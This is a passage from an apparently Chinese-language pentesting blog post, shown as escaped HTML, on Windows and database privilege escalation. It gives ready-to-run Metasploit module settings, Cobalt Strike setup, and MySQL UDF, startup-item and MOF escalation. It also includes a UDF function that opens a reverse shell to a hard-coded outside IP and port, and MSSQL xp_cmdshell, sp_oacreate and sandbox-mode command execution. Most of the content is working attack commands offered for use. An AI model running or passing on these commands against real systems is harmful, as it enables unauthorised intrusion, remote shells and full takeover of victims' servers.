prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;特别注意如果没有显示出来漏洞利用脚本，需要更新msf即使用msfupdate命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用EXP溢出提权，注意需要重新监听会话并指定端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;background&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/local/ms16_075_reflection_juicy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set localhot. set local port&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set session 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cs半自动化提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs半自动化提权&#34;&gt;#&lt;/a&gt; cs 半自动化提权&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;配置启动&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;服务器启动服务端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x teamserver &amp;amp; ./teamserver IP password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;客户端连接服务端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;运行cobaltstrike.bat（运行不起来请检测JDK版本）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;配置监听器生成后执行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;选择提权模块调用执行，默认的脚本不够好，需要用加载的如 taowu、lodon 脚本&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据库提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库提权&#34;&gt;#&lt;/a&gt; 数据库提权&lt;/h3&gt;
&lt;h4 id=&#34;mysql-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mysql-提权&#34;&gt;#&lt;/a&gt; mysql 提权&lt;/h4&gt;
&lt;p&gt;用系统漏洞提权要比数据库漏洞提权更容易得到权限。&lt;/p&gt;
&lt;p&gt;一般采用 UDF 提权和启动项的方式，都需要拿到此时的数据库的 root 权限， 并且两者都是需要往特殊目录下写入文件，并且需要 - secure-file-priv 没进行目 录限制，如果做了目录限制是无法提权到系统权限的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mysql UDF 提权&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;mysql&amp;lt;5.2 导出目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c:/windows或system32；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;mysql=&amp;gt;5.2 导出安装目录/lib/plugin/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;select version()查看当前的数据库版本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;select @@basedir查看当前的目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GRANT ALL PRIVILEGES ON *.* TO &amp;#x27;帐号&amp;#x27;@&amp;#x27;%&amp;#x27; IDENTIFIED BY &amp;#x27;密码&amp;#x27; WITH GRANT OPTION;允许所有账户的外连&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 MSF 中的 exploit/multi/mysql/mysql_udf_payload 模块可以进行 UDF 提 权，MSF 会将 dll 文件写入 lib\plugin\ 目录下 (如果没有 /lib/plugin/ 这个目录，需要 手动创建这个文件夹), 该 dll 文件中包含 sys_exec () 和 sys_eval () 两个函数，但是 默认只创建 sys_exec () 函数，该函数执行并不会有回显。我们可以手动创建 sys_eval () 函数，来执行有回显的命令。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF:（前提先开外连）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/mysql/mysql_udf_payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 47.102.195.100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;当msf将dll文件写入/lib/plugin下，可使用Navicat调用系统命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from mysql.func where name = &amp;quot;sys_exec&amp;quot;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建函数绑定dll&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create function sys_eval returns string soname &amp;quot;WqkerHcA.dll&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调用函数进行命令执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select sys_eval(&amp;quot;whoami&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;mysql 启动项提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;写一些启动项到 windows 上，windows 启动后会启动这类 bat 或者 exe，可以在 bat 中加 calc pause 进行测试。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF：（前提先开外连）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/mysql/mysql_start_up&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 47.102.195.100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;mysql 通过 udf 反弹 shell&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原理同 udf 提权，再 plugin 下写入 dll 文件，用 sys_exec 调用 dll 执行系统命令，从而反弹 shell，需要提前监听 shell 端口（如果 linux 的话就是 so 文件）。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://blog.csdn.net/weixin_43801718/article/details/105493042&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use mysql;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set @a=concat(&amp;#x27;&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create table Ghost(data LONGBLOB);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;insert into Ghost values(&amp;quot;&amp;quot;);update Ghost set data = @a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select data from Ghost into DUMPFILE &amp;#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create function backshell returns string soname &amp;#x27;udf.dll&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select backshell(&amp;#x27;47.94.236.117&amp;#x27;,7788)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;MOF 提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;MOF-Win2008 后权限控制导致无效（不好用）&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlzaGFvbmlhbi9wLzYzODQ1MzUuaHRtbA==&#34;&gt;https://www.cnblogs.com/xishaonian/p/6384535.html&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/mysql/mysql_mof&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;mssql-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mssql-提权&#34;&gt;#&lt;/a&gt; mssql 提权&lt;/h4&gt;
&lt;p&gt;MSSQL 提权（windows 安装的，在 linux 上没有）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;xp_cmdshell 提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。如果用户拥有管理员 sa 权限则可以用 sp_configure 重新开启它。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXEC sp_configure &amp;#x27;show advanced options&amp;#x27;, 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RECONFIGURE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXEC sp_configure &amp;#x27;xp_cmdshell&amp;#x27;, 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RECONFIGURE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;关闭&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec sp_configure &amp;#x27;show advanced options&amp;#x27;, 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec sp_configure &amp;#x27;xp_cmdshell&amp;#x27;, 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXEC master.dbo.xp_cmdshell &amp;#x27;命令&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec master.sys.sp_addextendedproc &amp;#x27;xp_cmdshell&amp;#x27;, &amp;#x27;C:\Program Files\MicrosoftSQL Server\MSSQL\Binn\xplog70.dll&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;sp_oacreate 提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXEC sp_configure &amp;#x27;show advanced options&amp;#x27;, 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RECONFIGURE WITH OVERRIDE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXEC sp_configure &amp;#x27;Ole Automation Procedures&amp;#x27;, 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RECONFIGURE WITH OVERRIDE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;关闭&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXEC sp_configure &amp;#x27;show advanced options&amp;#x27;, 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RECONFIGURE WITH OVERRIDE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXEC sp_configure &amp;#x27;Ole Automation Procedures&amp;#x27;, 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RECONFIGURE WITH OVERRIDE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;declare @shell int exec sp_oacreate &amp;#x27;wscript.shell&amp;#x27;,@shell output exec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sp_oamethod @shell,&amp;#x27;run&amp;#x27;,null,&amp;#x27;c:\windows\system32\cmd.exe /c whoami &amp;gt;c:\\1.txt&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;沙盒提权&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;不开启的话在执行xp_regwrite会提示让我们开启：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec sp_configure &amp;#x27;show advanced options&amp;#x27;,1;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec sp_configure &amp;#x27;Ad Hoc Distributed Queries&amp;#x27;,1;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec master..xp_regwrite &amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;,&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;,&amp;#x27;SandBoxMode&amp;#x27;,&amp;#x27;REG_DWORD&amp;#x27;,0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec master.dbo.xp_regread &amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;,&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;,&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行系统命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 